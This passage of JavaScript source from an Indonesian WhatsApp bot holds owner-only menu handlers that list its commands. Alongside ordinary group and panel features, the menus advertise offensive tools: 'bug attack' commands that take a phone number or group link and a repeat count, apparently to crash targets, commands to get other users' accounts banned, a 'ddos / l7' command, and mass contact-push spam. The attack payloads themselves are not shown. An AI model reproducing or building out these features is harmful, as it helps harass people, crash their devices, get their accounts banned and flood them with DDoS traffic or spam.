╎⭔${prefix}janie
╎⭔${prefix}jajang
╎⭔${prefix}gptvoice
╚┈┈┈┈┈┈┈┈┈┈┈┈
 Powered By *@${owned.split("@")[0]}*`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'SC PRIVAT',
thumbnailUrl: 'https://telegra.ph/file/249a3a4707016db9c5194.jpg',
sourceUrl: "https://s.id/OktzOffc",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
        case "serverpanel1": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

╔┈┈( *SERVER PANEL 1* )┈┈
╎
╎⭔${prefix}panel
╎⭔${prefix}linklog1
╎⭔${prefix}listusr1
╎⭔${prefix}delusr1
╎⭔${prefix}listsrv1
╎⭔${prefix}delsrv1
╎⭔${prefix}premlist1
╎⭔${prefix}ramlist1
╎⭔${prefix}addusr1
╎⭔${prefix}addsrv1
╎⭔${prefix}reinstall1
╎⭔${prefix}tutorial1
╎⭔${prefix}updatesrv1
╎⭔${prefix}suspend1 *id*
╎⭔${prefix}unsuspend1 *id*
╎⭔${prefix}crateadmin1
╎⭔${prefix}listadmin1
╚┈┈┈┈┈┈┈┈┈┈┈┈
 Powered By *@${owned.split("@")[0]}*`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'SC PRIVAT',
thumbnailUrl: 'https://telegra.ph/file/249a3a4707016db9c5194.jpg',
sourceUrl: "https://s.id/OktzOffc",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
        case "serverpanel2": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

╔┈┈( *SERVER PANEL 2* )┈┈
╎
╎⭔${prefix}panel
╎⭔${prefix}linklog2
╎⭔${prefix}listusr2
╎⭔${prefix}delusr2
╎⭔${prefix}listsrv2
╎⭔${prefix}delsrv2
╎⭔${prefix}premlist2
╎⭔${prefix}ramlist2
╎⭔${prefix}addusr2
╎⭔${prefix}addsrv2
╎⭔${prefix}reinstall2
╎⭔${prefix}tutorial2
╎⭔${prefix}updatesrv2
╎⭔${prefix}suspend2 *id*
╎⭔${prefix}unsuspend2 *id*
╎⭔${prefix}crateadmin2
╎⭔${prefix}listadmin2
╚┈┈┈┈┈┈┈┈┈┈┈┈
 Powered By *@${owned.split("@")[0]}*`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'SC PRIVAT',
thumbnailUrl: 'https://telegra.ph/file/249a3a4707016db9c5194.jpg',
sourceUrl: "https://s.id/OktzOffc",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
        case "serverpanel3": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SERVER PANEL 3* )▭▬▭

⭔${prefix}panel
⭔${prefix}linklog3
⭔${prefix}listusr3
⭔${prefix}listsrv3
⭔${prefix}delusr3
⭔${prefix}delsrv3
⭔${prefix}crateadmin3
⭔${prefix}listadmin3

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'SC PRIVAT',
thumbnailUrl: 'https://telegra.ph/file/249a3a4707016db9c5194.jpg',
sourceUrl: "https://s.id/OktzOffc",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
        case "textwamenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *TEXT WA MENU* )▭▬▭

 ༺ 𝗙𝗔𝗞𝗘 𝗖𝗛𝗔𝗧 ༻
 
┣┣⃟❍𒁂⃝➢${prefix}fakec1
┣┣⃟❍𒁂⃝➢${prefix}fakec2
┣┣⃟❍𒁂⃝➢${prefix}fakec3
┣┣⃟❍𒁂⃝➢${prefix}fakec4
┣┣⃟❍𒁂⃝➢${prefix}fakec5
┣┣⃟❍𒁂⃝➢${prefix}fakec6
┣┣⃟❍𒁂⃝➢${prefix}fakec7
┣┣⃟❍𒁂⃝➢${prefix}fakec8
┣┣⃟❍𒁂⃝➢${prefix}fakec9
┣┣⃟❍𒁂⃝➢${prefix}fakec10
┣┣⃟❍𒁂⃝➢${prefix}fakec11
┣┣⃟❍𒁂⃝➢${prefix}alltotal

 ༺ 𝗨𝗡𝗕𝗔𝗡 𝗦𝗣𝗔𝗠  ༻
 
┣┣⃟❍𒁂⃝➢${prefix}textunbanv1
┣┣⃟❍𒁂⃝➢${prefix}textunbanv2
┣┣⃟❍𒁂⃝➢${prefix}textunbanv3
┣┣⃟❍𒁂⃝➢${prefix}textunbanv4
┣┣⃟❍𒁂⃝➢${prefix}textunbanv5
┣┣⃟❍𒁂⃝➢${prefix}textunbanv6
┣┣⃟❍𒁂⃝➢${prefix}textunbanv7
┣┣⃟❍𒁂⃝➢${prefix}textunbanv8
┣┣⃟❍𒁂⃝➢${prefix}textunbanv9
┣┣⃟❍𒁂⃝➢${prefix}textunbanv10
┣┣⃟❍𒁂⃝➢${prefix}textunbanv11
┣┣⃟❍𒁂⃝➢${prefix}textunbanv12
┣┣⃟❍𒁂⃝➢${prefix}textunbanv13
┣┣⃟❍𒁂⃝➢${prefix}textunbanv14
┣┣⃟❍𒁂⃝➢${prefix}textunbanv15
┣┣⃟❍𒁂⃝➢${prefix}textunbanv16
┣┣⃟❍𒁂⃝➢${prefix}textunbanv17
┣┣⃟❍𒁂⃝➢${prefix}textunbanv18
┣┣⃟❍𒁂⃝➢${prefix}textunbanv19
┣┣⃟❍𒁂⃝➢${prefix}textunbanv20
┣┣⃟❍𒁂⃝➢${prefix}textunbanv21

 ༺ 𝗕𝗔𝗡𝗡𝗘𝗗 ༻
 
┣┣⃟❍𒁂⃝➢${prefix}textbanv1
┣┣⃟❍𒁂⃝➢${prefix}textbanv2
┣┣⃟❍𒁂⃝➢${prefix}textbanv3
┣┣⃟❍𒁂⃝➢${prefix}textbanv4
┣┣⃟❍𒁂⃝➢${prefix}textbanv5
┣┣⃟❍𒁂⃝➢${prefix}textbanv6
┣┣⃟❍𒁂⃝➢${prefix}textbanv7
┣┣⃟❍𒁂⃝➢${prefix}textbanv8
┣┣⃟❍𒁂⃝➢${prefix}textbanv9
┣┣⃟❍𒁂⃝➢${prefix}textbanv10

༺ 𝗧𝗢𝗢𝗟𝗦 ༻

 ┣┣⃟❍𒁂⃝➢${prefix}tools1
 ┣┣⃟❍𒁂⃝➢${prefix}tools2
 
 Powered By *@${owned.split("@")[0]}*`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'SC PRIVAT',
thumbnailUrl: 'https://telegra.ph/file/249a3a4707016db9c5194.jpg',
sourceUrl: "https://s.id/OktzOffc",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "bugmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

╔┈┈( *BUG MENU* )┈┈
╎
╎⭔ ${prefix}bugnumber
╎⭔ ${prefix}buggroup
╎⭔ ${prefix}bannedmenu
╎⭔ ${prefix}unbanmenu
╎⭔ ${prefix}bugemoji
╎⭔ ${prefix}reportbug
╚┈┈┈┈┈┈┈┈┈┈┈┈
 Powered By *@${owned.split("@")[0]}*`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'SC PRIVAT',
thumbnailUrl: 'https://telegra.ph/file/249a3a4707016db9c5194.jpg',
sourceUrl: "https://s.id/OktzOffc",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "sewabotmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SEWABOT MENU* )▭▬▭

⭔ ${prefix}buysewainbot
⭔ ${prefix}listsewa
⭔ ${prefix}konfirsewa
⭔ ${prefix}cancelsewa
⭔ ${prefix}sewa
⭔ ${prefix}buysewa

*NOTE : MASIH DALAM PERKEMBANGAN!!*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'SC PRIVAT',
thumbnailUrl: 'https://telegra.ph/file/249a3a4707016db9c5194.jpg',
sourceUrl: "https://s.id/OktzOffc",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "saldomenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SALDO MENU* )▭▬▭

⭔ ${prefix}saldonya ( Cek Saldo )
⭔ ${prefix}tfsaldo ( Jumlah )

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'SC PRIVAT',
thumbnailUrl: 'https://telegra.ph/file/249a3a4707016db9c5194.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "aimenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *AI MENU* )▭▬▭

⭔ ${prefix}bagaimanakah
⭔ ${prefix}apakah

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/0fc4f6dbbc5d5f95ede6f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "testimonimenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *TESTIMONI MENU* )▭▬▭

⭔ ${prefix}testi1
⭔ ${prefix}testi2
⭔ ${prefix}testi3
⭔ ${prefix}testi4
⭔ ${prefix}testi5
⭔ ${prefix}testi6
⭔ ${prefix}testi7 ( Proses )

 Testimoni By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/0fc4f6dbbc5d5f95ede6f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "scmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *KHUSUS DE4YOUHost* )▭▬▭

⭔ ${prefix}ambilsc1
⭔ ${prefix}ambilsc2
⭔ ${prefix}ambilsc3
⭔ ${prefix}ambilsc4
⭔ ${prefix}ambilsc5
⭔ ${prefix}ambilsc6
⭔ ${prefix}ambilsc7
⭔ ${prefix}ambilsc8
⭔ ${prefix}ambilsc9
⭔ ${prefix}ambilsc10 ( sc priv )
⭔ ${prefix}ambilsc11 ( sc hw )

⭔ ${prefix}ambilwa1
⭔ ${prefix}ambilwa2
⭔ ${prefix}ambilwa3
⭔ ${prefix}ambilwa4

⭔ ${prefix}sendwa1
⭔ ${prefix}sendwa2
⭔ ${prefix}sendwa3
⭔ ${prefix}sendwa4

⭔ ${prefix}sendsc1
⭔ ${prefix}sendsc2
⭔ ${prefix}sendsc3
⭔ ${prefix}sendsc4
⭔ ${prefix}sendsc5
⭔ ${prefix}sendsc6
⭔ ${prefix}sendsc7
⭔ ${prefix}sendsc8
⭔ ${prefix}sendsc9
⭔ ${prefix}sendsc10 ( sc priv )
⭔ ${prefix}sendsc11 ( sc hw )


 *_Note : Sc Free Nanti Menambah Tunggu Owner Saya Meng Update Terimakasih._*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/0fc4f6dbbc5d5f95ede6f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "de4you": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *KHUSUS DE4YOU* )▭▬▭

⭔ ${prefix}de4you1
⭔ ${prefix}de4you2
⭔ ${prefix}de4you3

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/0fc4f6dbbc5d5f95ede6f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "topupmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:fkontak})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *TOPUP / SUNTIK SOSMED* )▭▬▭

⭔ ${prefix}ceksaldomaupedia
⭔ ${prefix}list-pascabayar
⭔ ${prefix}list-prabayar
⭔ ${prefix}list-sosmed
⭔ ${prefix}maudeposit
⭔ ${prefix}topupgame
⭔ ${prefix}cekgame
⭔ ${prefix}topup

*NOTE : MASIH DALAM PERKEMBANGAN!*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/0fc4f6dbbc5d5f95ede6f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "otpmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:fkontak})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *OTP MENU* )▭▬▭

⭔ ${prefix}profile
⭔ ${prefix}daftar-layanan
⭔ ${prefix}layanan-negara
⭔ ${prefix}layanan-otp
⭔ ${prefix}cancel-otp
⭔ ${prefix}saldo-kodeotp
⭔ ${prefix}cek-saldobri
⭔ ${prefix}wanumber
⭔ ${prefix}neednokos
⭔ ${prefix}nokoswa
⭔ ${prefix}cancelsms
⭔ ${prefix}sms
⭔ ${prefix}order
⭔ ${prefix}getorder
⭔ ${prefix}listdaftar
⭔ ${prefix}daftar
⭔ ${prefix}nowa

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/0fc4f6dbbc5d5f95ede6f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "groupmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:fkontak})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const txtus = `*Hi @${sender.split("@")[0]} 👋*

┌──『 *MENU GROUP* 』
│ ${prefix}owner
│ ${prefix}join ( khusus rafa )
│ ${prefix}qc *teks*
│ ${prefix}tts *teks*
│ ${prefix}sticker *reply image*
│ ${prefix}linkgroup
│ ${prefix}hidetag *teks*
│ ${prefix}setppbot *teks*
│ ${prefix}setbiobot *teks*
│ ${prefix}setppgroup *teks*
│ ${prefix}delppgc
│ ${prefix}add *nomor*
│ ${prefix}kick *nomor*
│ ${prefix}revoke
│ ${prefix}infogc
│ ${prefix}tagall
│ ${prefix}grup / gc
│ ${prefix}promote *nomor*
│ ${prefix}demote *nomor*
│ ${prefix}promoteall *nomor*
│ ${prefix}demoteall *nomor*
│ ${prefix}antilinkytvid *on/off*
│ ${prefix}antilinktwitter *on/off*
│ ${prefix}antilinktiktok *on/off*
│ ${prefix}antilinktelegram *on/off*
│ ${prefix}antilinkfacebook *on/off*
│ ${prefix}antilinkinstagram *on/off*
│ ${prefix}antilinkall *on/off*
│ ${prefix}antiwame *on/off*
│ ${prefix}antilinkgc *on/off*
│ ${prefix}antivirus *on/off*
└──────`
reply(txtus)
}
break
case "ownermenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:fkontak})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const txtow = `*Hi @${sender.split("@")[0]} 👋*

┌──『 *MENU OWNER* 』
│ ${prefix}addowner *nomor*
│ ${prefix}delowner *nomor*
│ ${prefix}addprem1 *nomor*
│ ${prefix}delprem1 *nomor*
│ ${prefix}addprem2 *nomor*
│ ${prefix}delprem2 *nomor*
│ ${prefix}setbotname *teks*
│ ${prefix}setbotbio *teks*
│ ${prefix}de4you
│ ${prefix}accreport
│ ${prefix}listonline
│ ${prefix}vidowner1
│ ${prefix}closetime
│ ${prefix}opentime
│ ${prefix}delete
│ ${prefix}totag
│ ${prefix}pesan
│ ${prefix}leave
│ ${prefix}ddos / l7
│ ${prefix}sendgc
│ ${prefix}sosmed
│ ${prefix}creategc *teksgc*
│ ${prefix}sdomain/sendomain
│ ${prefix}spanel/sendpanel
│ ${prefix}svps/sendvps
│ ${prefix}autojpm *on/off*
│ ${prefix}public *on/off*
│ ${prefix}self *on/off*
│ ${prefix}addip *ip*
│ ${prefix}speksrv
│ ${prefix}sendhutang
│ ${prefix}ambilcase
│ ${prefix}sendbyr
│ ${prefix}totalfitur
│ ${prefix}kudeta
│ ${prefix}cmdpanel
│ ${prefix}cmdthema
│ ${prefix}deletepm2
│ ${prefix}addpm2
│ ${prefix}getpm2
│ ${prefix}listpm2
│ ${prefix}getcase
│ ${prefix}getbot
│ ${prefix}getbio
│ ${prefix}listpc
│ ${prefix}listgc
│ ${prefix}listblock
│ ${prefix}unblock
│ ${prefix}block
│ ${prefix}vote
│ ${prefix}test
│ ${prefix}enc
│ ${prefix}ip
└──────`
reply(txtow)
}
break
case "pushkontakmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:fkontak})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const txtpu = `*Hi @${sender.split("@")[0]} 👋*

┌──『 *MENU PUSHKONTAK* 』
│ ${prefix}cekidgc
│ ${prefix}listgroup
│ ${prefix}pushkontakv1 *idgc|teks*
│ ${prefix}pushkontakv2 *teks*
│ ${prefix}pushkontakv3 *idgroup|jeda|teks*
│ ${prefix}pushkontakv4 *jeda|teks*
│ ${prefix}savecontactv1 *idgroup*
│ ${prefix}savecontactv2 *teks*
│ ${prefix}savekontak *teks*
│ ${prefix}getcontact *teks*
│ ${prefix}sendkontak *teks*
│ ${prefix}bcvideo *teks*
│ ${prefix}bcgc *teks*
│ ${prefix}jpmtag *teks*
│ ${prefix}jpm *teks*
└──────`
reply(txtpu)
}
break   
case "bugnumber": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const txtat = `*Hi @${sender.split("@")[0]} 👋*
_LIST MENU BUG BY *© DE4YOU Offcial*_
▬▭▬▭▬▭▬▭▬▭▬▭▬▭

「 *BUG ATTACK NUMBER* 」
● ${prefix}gas *nomor|jumlah*
● ${prefix}kill *nomor|jumlah*
● ${prefix}crash *nomor|jumlah*
● ${prefix}shoot *nomor|jumlah*
● ${prefix}bugkuy *nomor|jumlah*
● ${prefix}duarr *nomor|jumlah*
● ${prefix}killyou *nomor|jumlah*
● ${prefix}doblekill *nomor|jumlah*
● ${prefix}triplekill *nomor|jumlah*
● ${prefix}savage *nomor|jumlah*
● ${prefix}santet *nomor|jumlah*
● ${prefix}danger *nomor|jumlah*
● ${prefix}meninggal *nomor|jumlah*
● ${prefix}headshot *nomor|jumlah*
● ${prefix}mati *nomor|jumlah*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(txtat)
}
break
case "buggroup":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const txtv1 = `*Hi @${sender.split("@")[0]} 👋*
_LIST MENU BUG BY *© DE4YOU Offcial*_
▬▭▬▭▬▭▬▭▬▭▬▭▬▭

「 *BUG ATTACK GROUP v1* 」
● ${prefix}killgc *linkgc|jumlah*
● ${prefix}santetgc *linkgc|jumlah*
● ${prefix}gcwakwaw *linkgc|jumlah*
● ${prefix}togc *linkgc|jumlah*
● ${prefix}matigc *linkgc|jumlah*
● ${prefix}kuygc *linkgc|jumlah*
● ${prefix}attackgc *linkgc|jumlah*
● ${prefix}mampusgc *linkgc|jumlah*
● ${prefix}gasgc *linkgc|jumlah*
● ${prefix}ampasgc *linkgc|jumlah*
● ${prefix}bahayagc *linkgc|jumlah*
● ${prefix}hatihatigc *linkgc|jumlah*
● ${prefix}crashgc *linkgc|jumlah*
● ${prefix}stuckgc *linkgc|jumlah*
● ${prefix}ganasgc *linkgc|jumlah*

「 *BUG ATTACK GROUP v2* 」
● ${prefix}buggc *idgroup|jumlah*
● ${prefix}shootgc *idgroup|jumlah*
● ${prefix}dorrgc *idgroup|jumlah*
● ${prefix}attackgc1 *idgroup|jumlah*
● ${prefix}meninggalgc *idgroup|jumlah*
● ${prefix}matigc1*idgroup|jumlah*
● ${prefix}seranggc *idgroup|jumlah*
● ${prefix}bomgc *idgroup|jumlah*
● ${prefix}ledakangc *idgroup|jumlah*
● ${prefix}atomgc *idgroup|jumlah*
● ${prefix}hancurgc *idgroup|jumlah*
● ${prefix}bugzirgc *idgroup|jumlah*
● ${prefix}stuckgc2 *idgroup|jumlah*
● ${prefix}baugc *idgroup|jumlah*
● ${prefix}ultigc *idgroup|jumlah*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(txtv1)
}
break
case "bannedmenu":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const txtv2 = `┏━┳┳┳━┳┳┓
┃━┫┃┃┏┫━┫┏┓
┃┏┫┃┃┗┫┃┃┃┃
┗┛┗━┻━┻┻┛┃┃
┏┳┳━┳┳┳┓┏┫┣┳┓
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻┛┗┛━━┛

┌──『 *MENU BANNED* 』
│ ${prefix}call *nomor*
│ ${prefix}out *nomor*
│ ${prefix}verif *nomor*
│ ${prefix}kenon *nomor*
│ ${prefix}bannedv1 *nomor*
│ ${prefix}bannedv2 *nomor*
│ ${prefix}bannedv3 *nomor*
│ ${prefix}bannedv4 *nomor*
│ ${prefix}bannedv5 *nomor*
│ ${prefix}bannedv6 *nomor*
└──────`
reply(txtv2)
}
break
case "unbanmenu":{
